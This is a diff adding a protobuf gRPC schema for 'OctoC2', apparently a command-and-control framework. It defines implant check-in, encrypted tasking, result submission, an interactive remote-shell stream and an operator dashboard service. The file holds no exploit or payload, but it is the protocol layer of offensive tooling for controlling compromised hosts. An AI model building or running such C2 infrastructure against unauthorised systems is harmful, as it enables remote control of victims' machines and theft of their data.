@@ -1,0 +1,133 @@
+syntax = "proto3";
+
+package svc;
+
+// ── OctoC2 gRPC Service Definitions ──────────────────────────────────────────
+//
+// Used for the Codespaces SSH tunnel tentacle (Tentacle 4) and
+// the Pull Request + gRPC channel (Tentacle 8).
+//
+// Generate TypeScript bindings:
+//   bun run proto:gen
+// Or manually:
+//   protoc --plugin=protoc-gen-ts_proto \
+//     --ts_proto_out=server/src/proto \
+//     --ts_proto_opt=outputServices=grpc-js \
+//     proto/svc.proto
+
+// ── Common types ──────────────────────────────────────────────────────────────
+
+message BeaconInfo {
+  string id           = 1;
+  string hostname     = 2;
+  string username     = 3;
+  string os           = 4;
+  string arch         = 5;
+  int32  pid          = 6;
+  string public_key   = 7;  // base64url X25519 public key
+  string first_seen   = 8;  // ISO-8601
+  string last_seen    = 9;  // ISO-8601
+  string status       = 10; // "active" | "sleeping" | "lost"
+}
+
+message Task {
+  string id        = 1;
+  string kind      = 2;  // TaskKind enum value
+  string args_json = 3;  // JSON-encoded args
+  string issued_at = 4;
+  // Encrypted with beacon's public key (only beacon can decrypt)
+  string ciphertext = 5;
+  string nonce      = 6;
+}
+
+message TaskResult {
+  string task_id      = 1;
+  string beacon_id    = 2;
+  bool   success      = 3;
+  string output       = 4;
+  string data         = 5;  // base64url optional binary payload
+  string completed_at = 6;
+  string signature    = 7;  // ed25519 detached sig of (task_id + output + completed_at)
+}
+
+// ── Beacon Service (used by implants) ─────────────────────────────────────────
+
+message CheckinRequest {
+  string beacon_id  = 1;
+  string public_key = 2;
+  string hostname   = 3;
+  string username   = 4;
+  string os         = 5;
+  string arch       = 6;
+  int32  pid        = 7;
+  string checkin_at = 8;
+}
+
+message CheckinResponse {
+  repeated Task pending_tasks = 1;
+  // Signed nonce from operator — beacon verifies before trusting tasks
+  string operator_nonce     = 2;
+  string operator_signature = 3;
+}
+
+message SubmitResultRequest {
+  TaskResult result = 1;
+}
+
+message SubmitResultResponse {
+  bool   accepted = 1;
+  string message  = 2;
+}
+
+service BeaconService {
+  // Beacon calls this each sleep cycle to pick up pending tasks
+  rpc Checkin (CheckinRequest) returns (CheckinResponse);
+  // Beacon submits completed task output
+  rpc SubmitResult (SubmitResultRequest) returns (SubmitResultResponse);
+  // Bidirectional stream for interactive shell (Tentacle 8)
+  rpc InteractiveShell (stream ShellInput) returns (stream ShellOutput);
+}
+
+message ShellInput {
+  string beacon_id = 1;
+  bytes  data      = 2;  // raw stdin bytes
+}
+
+message ShellOutput {
+  bytes  data      = 1;  // raw stdout/stderr bytes
+  bool   exit      = 2;
+  int32  exit_code = 3;
+}
+
+// ── Operator Service (used by octoctl / dashboard) ────────────────────────────
+
+message ListBeaconsRequest  {}
+message ListBeaconsResponse { repeated BeaconInfo beacons = 1; }
+
+message IssueTaskRequest {
+  string beacon_id = 1;
+  Task   task      = 2;
+}
+
+message IssueTaskResponse {
+  bool   accepted = 1;
+  string task_id  = 2;
+}
+
+message GetResultsRequest  { string beacon_id = 1; }
+message GetResultsResponse { repeated TaskResult results = 1; }
+
+service OperatorService {
+  rpc ListBeacons  (ListBeaconsRequest)  returns (ListBeaconsResponse);
+  rpc IssueTask    (IssueTaskRequest)    returns (IssueTaskResponse);
+  rpc GetResults   (GetResultsRequest)   returns (GetResultsResponse);
+  // Stream live events (new checkins, task completions) to dashboard
+  rpc StreamEvents (ListBeaconsRequest)  returns (stream BeaconEvent);
+}
+
+message BeaconEvent {
+  string kind      = 1; // "checkin" | "task_result" | "beacon_lost"
+  string beacon_id = 2;
+  string payload   = 3; // JSON-encoded event data
+  string timestamp = 4;
+}
